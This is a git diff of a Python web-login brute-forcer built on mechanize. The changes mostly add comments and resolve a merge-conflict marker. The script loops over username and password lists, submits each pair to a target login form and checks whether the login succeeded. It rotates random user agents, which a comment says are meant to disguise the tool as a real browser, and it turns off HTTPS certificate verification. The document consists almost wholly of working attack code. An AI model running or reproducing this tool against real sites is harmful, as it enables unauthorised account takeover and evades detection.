@@ -7,12 +7,16 @@ import ssl
 
 
 def brute(parameters):
+    '''
+    tries all option for usernames and passwords on the login page 
+    '''
     content = {'url': parameters['url'],
                'method': parameters['method'],
                'user_param': parameters['user_param'],
                'password_param': parameters['password_param'],
                'action' : parameters['action'],
                }
+    # if userlist is provided then checks if passwordlist is provided or just 1 password
     if parameters['user_list']:
         for user in parameters['user_list']:
             content['username'] = user
@@ -23,7 +27,7 @@ def brute(parameters):
             else:
                 content['password'] = parameters['password']
                 attack(content)
-
+    # if 1 username is provided then checks if passwordlist is provided or just 1 password 
     elif parameters['password_list']:
         content['username'] = parameters['username']
         for password in parameters['password_list']:
@@ -37,7 +41,9 @@ def brute(parameters):
 
 
 def attack(content):
-
+    '''
+    
+    '''
     user = str(content['username'])[2:-1]
     pwd = str(content['password'])[2:-1]
     
@@ -52,6 +58,7 @@ def attack(content):
         # Handle target environment that doesn't support HTTPS verification
         ssl._create_default_https_context = _create_unverified_https_context
     url = content['url']
+    #build packet headers in order to disguise mechanize as an actual browser
     headers = [('User-Agent', get_random_user_agent().encode().decode('utf-8')),
                ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
                     ('Accept-Language', 'en-gb,en;q=0.5'),
@@ -63,33 +70,34 @@ def attack(content):
                     ('Referer', url)]
     br.addheaders=headers
 
-    print('trying' +' username:' + user+' password:'+pwd)
-
+    print('[+][attack] trying' +' username:' + user+' password:'+pwd)
+    
+    #open mechanize browser
     br.open(url)
+    
+    #find the login form in order to fill in fields 
     for form in br.forms():
         if form.attrs['action'] == content['action']:
             br.form = form
+            break
+    # fill in username and password fields
     br[content['user_param']] = content['username']
     br[content['password_param']] = content['password']
-    res = br.submit()
-<<<<<<< HEAD
-=======
-
->>>>>>> 701fbfd6fd47d8e4c58ddfebeb45ae81968180f2
+    res = br.submit() # submit credentials 
     if check_login(res, content['password_param'], content['user_param']):
-
         print('login successfull\n\nusername: ' + user + '\npassword: ' + pwd)
         exit(0)
 
 
 def get_random_user_agent():
-    ''' generate a random user_agentto use in the header of the packet'''
+    '''generate random user agent to fill in the packet header'''
     import numpy as np
     random_ua = ''
     ua_file = 'utils/user_agent.txt'
-    # delays = [5, 10, 15]
+    # delays = [5, 10, 15] 
     # delay = np.random.choice(delays)
-    # time.sleep(delay)
+    # time.sleep(delay) # delay 
+    
     try:
         with open(ua_file) as f:
             lines = f.readlines()
@@ -105,24 +113,21 @@ def get_random_user_agent():
     finally:
         return random_proxy[0:len(random_proxy) - 2]
 
-
 def check_login(content, password_param, user_param):
-    pass_param = 'type="password" name="' + password_param + '"'
-    pass_param1 = 'name="'+password_param + '"'+'type="password" '
+    '''
+    checks if login was successful by checking if status code is 200 and if the password field that 
+    is contained in the login form is no longer found in the page source
+    '''
     read = str(content.read())
     doc = html.document_fromstring(read)
     element = doc.xpath('//input[@type="password"]')
-
-    '''if read.find(pass_param) > 0 or read.find(pass_param1) > 0:
-            return False'''
+    
     for field in element:
      if field.get('name') == password_param:
          return False
-
 
     if content.code != 200:
         print(content.code)
         return False
     else:
-        #print(content.read)
         return True
